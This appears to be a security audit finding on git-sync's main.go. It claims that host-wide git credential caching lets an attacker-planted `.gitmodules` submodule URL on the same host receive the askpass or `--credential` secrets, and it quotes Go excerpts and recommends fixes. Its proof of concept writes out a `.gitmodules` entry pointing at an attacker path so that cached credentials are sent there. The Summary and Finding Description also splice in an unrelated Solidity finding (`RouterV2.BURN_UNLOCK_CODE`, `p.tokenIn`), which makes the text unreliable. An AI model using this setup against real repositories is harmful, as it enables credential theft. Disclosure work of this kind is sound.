### Title
Host-wide (not repo-scoped) git credential caching allows attacker-controlled `.gitmodules` submodule URLs to exfiltrate `--askpass-url`/`--credential` secrets to a same-host, attacker-owned path - (File: main.go)

### Summary
`RouterV2.BURN_UNLOCK_CODE` trusts an attacker-influenceable `p.tokenIn` and uses it downstream for a privileged operation with no check that it is the *intended* token. In `git-sync` the analogous unvalidated-trust pattern is: `.gitmodules` submodule URLs come entirely from **untrusted, attacker-pushed repo content**, and git-sync neither validates them nor scopes the credentials it configures to the exact repo it was told to sync. It stores askpass/username-password credentials with `git credential approve` and enables `credential.helper = cache` [1](#0-0)  without setting `credential.useHttpPath`. Git's default credential matching keys on protocol+host only (not path), so any submodule URL an attacker plants under the *same host* as the configured `--repo` will silently receive the exact same cached username/password that git-sync obtained via `--askpass-url` or `--credential`.

### Finding Description
- The submodule URLs that drive `git submodule update --init --recursive` are read from `.gitmodules`, which is fully attacker-controlled content of the synced (untrusted) repository [2](#0-1) .
- git-sync fetches credentials from `--askpass-url` and stores them for `git.repo` only, via `git credential approve` [3](#0-2) , and similarly funnels `--username/--password` and `--credential` entries into the same store [4](#0-3) .
- Credential persistence uses `credential.helper cache` [5](#0-4) , and git-sync never sets `credential.useHttpPath=true`. Per git's documented credential-matching semantics, the cache is keyed by `protocol://host` (and username, if present) — **not** by path — unless `useHttpPath` is explicitly enabled.
- Consequently, when `configureWorktree` runs `git submodule update --init --recursive` against a `.gitmodules` entry that points to a different path on the *same host* as `--repo` (e.g. `https://git.example.com/legit/main.git` configured, but `.gitmodules` adds `https://git.example.com/attacker/evil.git`), git will transparently reuse the cached username/password for that fetch — sending the real secret to a destination the operator never authorized, exactly as `possibleAdapter`/`p.tokenIn` in the Solidity report is silently trusted for a sensitive operation despite being attacker-supplied.
- This is reachable purely by an attacker who can push a commit to the tracked repository (adding/modifying `.gitmodules`), matching the "attacker-pushed commit" threat model in scope.

### Impact Explanation
If the attacker's planted submodule path is served by infrastructure the attacker controls (common on multi-tenant/self-service git hosts sharing one hostname, or any host where the attacker can stand up a listener under that same origin, e.g. via an open/self-registration git server), the Basic-Auth credential (askpass-url username/password or `--credential` secret) is transmitted directly to the attacker, resulting in credential/token disclosure. This is a direct violation of the "credential or token disclosure" impact accepted by the validation rules.

### Likelihood Explanation
Requires: (1) `--submodules` not set to `off` (default is `recursive`), and (2) an authentication mode that populates the git credential store (`--askpass-url`, `--username`/`--password`, or `--credential`) against a host that also permits attacker-controlled paths/projects. These are common, realistic production configurations (submodules default on; askpass-url is a documented, recommended auth mode). No malicious operator or leaked key is required — only push access to the synced repository, which is the explicit unprivileged-attacker threat model here.

### Recommendation
- Set `credential.useHttpPath = true` globally so cached credentials are scoped to the exact path used when they were stored, preventing reuse across differing repo paths on the same host.
- Alternatively/additionally, validate and restrict submodule URLs (e.g., disallow submodules resolving outside an explicit allow-list of hosts/paths, or default `--submodules` handling to reject relative/`same-host-different-path` URLs unless explicitly permitted).
- Scope credential storage more strictly than `protocol+host` where possible (e.g., store per full origin+path, or avoid a shared cache helper for tokens that must not cross repos on the same host).

### Proof of Concept
1. Configure git-sync: `--repo=https://git.example.com/legit/main.git --askpass-url=http://cred-service/creds --submodules=recursive` (default).
2. Attacker with push access to `legit/main.git` adds `.gitmodules`:
   ```
   [submodule "evil"]
     path = evil
     url = https://git.example.com/attacker/evil.git
   ```
   and commits/pushes it.
3. On next sync, `configureWorktree` runs `git submodule update --init --recursive` [2](#0-1) , which fetches `https://git.example.com/attacker/evil.git`.
4. Because `credential.helper=cache` is keyed by host only (no `useHttpPath`) [6](#0-5) , git reuses the credential previously approved for `git.repo` (`legit/main.git`) [7](#0-6)  and sends it as HTTP Basic Auth to `attacker/evil.git`, which the attacker's own project/hosting endpoint can log — disclosing the askpass-url-issued secret.

Note: Full verification that the target git host allows attacker-registrable paths under the same origin (needed to actually capture the header) could not be confirmed from the repository alone — this depends on deployment/hosting environment, not on git-sync code, and is stated here as a required condition rather than proven in-repo.

### Citations

**File:** main.go (L720-746)
```go
	// Merge credential sources.
	if *flUsername == "" {
		// username and user@host URLs are validated as mutually exclusive
		if u, err := url.Parse(*flRepo); err == nil { // it may not even parse as a URL, that's OK
			// Note that `ssh://user@host/path` URLs need to retain the user
			// field. Out of caution, we only handle HTTP(S) URLs here.
			if u.User != nil && (u.Scheme == "http" || u.Scheme == "https") {
				if user := u.User.Username(); user != "" {
					*flUsername = user
				}
				if pass, found := u.User.Password(); found {
					*flPassword = pass
				}
				u.User = nil
				*flRepo = u.String()
			}
		}
	}
	if *flUsername != "" {
		cred := credential{
			URL:          *flRepo,
			Username:     *flUsername,
			Password:     *flPassword,
			PasswordFile: *flPasswordFile,
		}
		*flCredentials = append([]credential{cred}, (*flCredentials)...)
	}
```

**File:** main.go (L1733-1747)
```go
	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```

**File:** main.go (L2125-2184)
```go
// CallAskPassURL consults the specified URL looking for git credentials in the
// response.
//
// The expected URL callback output is below,
// see https://git-scm.com/docs/gitcredentials for more examples:
//
//	username=xxx@example.com
//	password=xxxyyyzzz
func (git *repoSync) CallAskPassURL(ctx context.Context) error {
	git.log.V(3).Info("calling auth URL to get credentials")

	var netClient = &http.Client{
		Timeout: time.Second * 1,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	httpReq, err := http.NewRequestWithContext(ctx, http.MethodGet, git.authURL, nil)
	if err != nil {
		return fmt.Errorf("can't create auth request: %w", err)
	}
	resp, err := netClient.Do(httpReq)
	if err != nil {
		return fmt.Errorf("can't access auth URL: %w", err)
	}
	defer func() {
		_ = resp.Body.Close()
	}()
	if resp.StatusCode != http.StatusOK {
		errMessage, err := io.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("auth URL returned status %d, failed to read body: %w", resp.StatusCode, err)
		}
		return fmt.Errorf("auth URL returned status %d, body: %q", resp.StatusCode, string(errMessage))
	}
	authData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("can't read auth response: %w", err)
	}

	username := ""
	password := ""
	for line := range strings.SplitSeq(string(authData), "\n") {
		keyValues := strings.SplitN(line, "=", 2)
		if len(keyValues) != 2 {
			continue
		}
		switch keyValues[0] {
		case "username":
			username = keyValues[1]
		case "password":
			password = keyValues[1]
		}
	}

	if err := git.StoreCredentials(ctx, git.repo, username, password); err != nil {
		return err
	}

	return nil
```

**File:** main.go (L2276-2302)
```go
// SetupDefaultGitConfigs configures the global git environment with some
// default settings that we need.
func (git *repoSync) SetupDefaultGitConfigs(ctx context.Context) error {
	configs := []keyVal{{
		// Never auto-detach GC runs.
		key: "gc.autoDetach",
		val: "false",
	}, {
		// Fairly aggressive GC.
		key: "gc.pruneExpire",
		val: "now",
	}, {
		// How to manage credentials (for those modes that need it).
		key: "credential.helper",
		val: "cache --timeout 3600",
	}, {
		// Never prompt for a password.
		key: "core.askPass",
		val: "true",
	}}

	for _, kv := range configs {
		if _, _, err := git.Run(ctx, "", "config", "--global", kv.key, kv.val); err != nil {
			return fmt.Errorf("error configuring git %q %q: %w", kv.key, kv.val, err)
		}
	}
	return nil
```
